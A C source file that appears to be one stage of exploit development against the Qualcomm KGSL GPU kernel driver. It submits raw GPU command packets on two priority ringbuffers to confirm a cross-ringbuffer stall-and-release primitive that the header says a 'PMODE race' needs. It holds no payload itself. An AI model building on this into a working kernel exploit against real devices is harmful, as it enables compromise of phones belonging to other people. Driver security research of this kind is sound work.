/*
 * kgsl_race_harness.c - stage 3, experiment S3.0:
 * validate the stall/release synchronization primitive across ringbuffers.
 *
 *   ctx0 (priority 1 -> rb0): stall IB
 *       OUT[1] = 0x1111          (signal "entered stall")
 *       OUT[2] = 0                (flag)
 *       WAIT_REG_MEM OUT[2] == 0xFFFFFFFF
 *       OUT[0] = 0xAAAA           (continue after release)
 *   ctx1 (priority 8 -> rb2): release IB
 *       OUT[2] = 0xFFFFFFFF
 *
 * If the higher-priority rb2 command preempts the stalled rb0 wait, OUT[0]
 * becomes 0xAAAA.  This is the synchronization mechanism the PMODE race needs.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_race_harness kgsl_race_harness.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_sched_yield 124
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_drawctxt_create{u32 flags;u32 drawctxt_id;};
#define IOCTL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_command_object{u64 offset;u64 gpuaddr;u64 size;u32 flags;u32 id;};
struct kgsl_gpu_command{u64 flags;u64 cmdlist;u32 cmdsize;u32 numcmds;u64 objlist;u32 objsize;u32 numobjs;u64 synclist;u32 syncsize;u32 numsyncs;u32 context_id;u32 timestamp;};
#define IOCTL_GPU_COMMAND IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x4A,sizeof(struct kgsl_gpu_command))
#define KGSL_CMDLIST_IB 0x1u
#define CP_WAIT_REG_MEM 0x3cu
#define CP_MEM_WRITE 0x3du

static u32 parity(u32 v){v^=v>>4;v^=v>>8;v^=v>>12;v^=v>>16;v^=v>>20;v^=v>>24;v^=v>>28;return (0x9669u>>(v&0xf))&1u;}
static u32 pkt7(u32 op,u32 cnt){return 0x70000000u|(cnt&0x3fffu)|(parity(cnt)<<15)|((op&0x7fu)<<16)|(parity(op)<<23);}
static void dc_civac(void*p,u64 len){u64 a=(u64)p&~63ull,b=((u64)p+len+63)&~63ull;for(;a<b;a+=64)asm volatile("dc civac, %0"::"r"(a):"memory");asm volatile("dsb ish":::"memory");}
static u32*mw(u32*n,u64 addr,u32 val){ n[0]=pkt7(CP_MEM_WRITE,3); n[1]=(u32)addr; n[2]=(u32)(addr>>32); n[3]=val; return n+4; }
static u32*wait(u32*n,u64 addr,u32 ref){ n[0]=pkt7(CP_WAIT_REG_MEM,6); n[1]=0x13; n[2]=(u32)addr; n[3]=(u32)(addr>>32); n[4]=ref; n[5]=0xFFFFFFFFu; n[6]=0x1; return n+7; }
static long gfd; static u32*gout; static u64 gout_gpu;
struct ctx { u32 id; u32 cmdid; u64 cmdgpu; u32*cmd; };
static long submit(struct ctx*c,u32 cnt,u32 ts){
    dc_civac(c->cmd,cnt*4);
    struct kgsl_command_object co; co.offset=0; co.gpuaddr=c->cmdgpu; co.size=cnt*4; co.flags=KGSL_CMDLIST_IB; co.id=c->cmdid;
    struct kgsl_gpu_command gc; for(u64 i=0;i<sizeof(gc);i++)((u8*)&gc)[i]=0;
    gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1; gc.context_id=c->id; gc.timestamp=ts;
    return sys3(SYS_ioctl,gfd,IOCTL_GPU_COMMAND,(s64)&gc);
}
static long alloc_buf(u64 size,u32*id,u64*gpu,u32**cpu){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=size;
    long r=sys3(SYS_ioctl,gfd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    *id=a.id; *gpu=a.gpuaddr; u64 mz=a.mmapsize?a.mmapsize:size;
    s64 m=sys6(SYS_mmap,0,mz,3,1,gfd,(s64)((u64)a.id<<12));
    if(m<=0) return -1;
    *cpu=(u32*)m; return 0;
}
static int wait_out(long ms,int idx,u32 want){
    for(int i=0;i<ms*10;i++){ dc_civac(gout,64); if(gout[idx]==want) return 1; sys3(SYS_sched_yield,0,0,0); }
    return 0;
}
void _start(void){
    out("[*] kgsl_race_harness S3.0 (cross-rb release)\n");
    gfd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    if(gfd<0){out("[!] open fail\n");sys3(SYS_exit,1,0,0);return;}
    struct ctx c0,c1;
    struct kgsl_drawctxt_create d;
    d.flags=0x1012u; d.drawctxt_id=0;  /* prio 1 -> rb0 */
    if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)){out("[!] ctx0 fail\n");sys3(SYS_exit,1,0,0);return;}
    c0.id=d.drawctxt_id;
    d.flags=0x8012u; d.drawctxt_id=0;  /* prio 8 -> rb2 */
    if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)){out("[!] ctx1 fail\n");sys3(SYS_exit,1,0,0);return;}
    c1.id=d.drawctxt_id;
    out("[1] ctx0(rb0)=");outdec(c0.id);out(" ctx1(rb2)=");outdec(c1.id);out("\n");
    if(alloc_buf(0x1000,&c0.cmdid,&c0.cmdgpu,&c0.cmd)){out("[!] buf0\n");sys3(SYS_exit,1,0,0);return;}
    if(alloc_buf(0x1000,&c1.cmdid,&c1.cmdgpu,&c1.cmd)){out("[!] buf1\n");sys3(SYS_exit,1,0,0);return;}
    u32 outid; if(alloc_buf(0x1000,&outid,&gout_gpu,&gout)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}
    gout[0]=0; gout[1]=0; gout[2]=0; dc_civac(gout,16);

    /* stall IB on rb0 */
    u32 k=0; u64 base=gout_gpu;
    k=(u32)(mw(&c0.cmd[k],base+4,0x1111)-c0.cmd);
    k=(u32)(mw(&c0.cmd[k],base+8,0x0)-c0.cmd);
    k=(u32)(wait(&c0.cmd[k],base+8,0xFFFFFFFF)-c0.cmd);
    k=(u32)(mw(&c0.cmd[k],base+0,0xAAAA)-c0.cmd);
    long r0=submit(&c0,k,1);
    out("[2] stall submit ret=");outdec(r0);out("\n");
    int entered=wait_out(2000,1,0x1111u);
    out("[3] stall entered -> ");out(entered?"yes\n":"no (marker not seen)\n");

    /* release from rb2 */
    k=0; k=(u32)(mw(&c1.cmd[k],base+8,0xFFFFFFFF)-c1.cmd);
    long r1=submit(&c1,k,2);
    out("[4] release submit ret=");outdec(r1);out("\n");
    int done=wait_out(3000,0,0xAAAAu);
    out("[5] stall released -> ");out(done?"YES (cross-rb release works; preemption active)\n":"NO (see notes; possible GPU hang/recovery)\n");

    out("[*] done\n");
    sys3(SYS_close,gfd,0,0);
    sys3(SYS_exit,0,0,0);
}
